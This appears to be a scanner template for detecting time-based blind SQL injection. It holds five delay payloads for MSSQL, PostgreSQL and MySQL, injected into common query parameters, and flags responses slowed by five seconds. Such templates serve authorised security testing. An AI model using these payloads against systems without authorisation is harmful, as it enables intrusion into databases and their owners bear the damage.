id: blind-sqli-time-delay

info:
  name: Blind SQL Injection - Time Delay
  author: oscuridad, sethbdev mod
  severity: high
  tags: sqli,blind

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      sqloscuridad:
        - "'; WAITFOR DELAY '0:0:5'--"
        - "'; SELECT pg_sleep(5)--"
        - "'; SELECT sleep(5)--"
        - "\" AND SLEEP(5)--"
        - "\" OR SLEEP(5)#"

    fuzzing:
      - part: query
        type: replace
        keys:
          - q
          - search
          - id
          - param
        values: "{{sqloscuridad}}"

    stop-at-first-match: true
    matchers:
      - type: dsl
        name: time-delay-detected
        dsl:
          - "duration>=5"
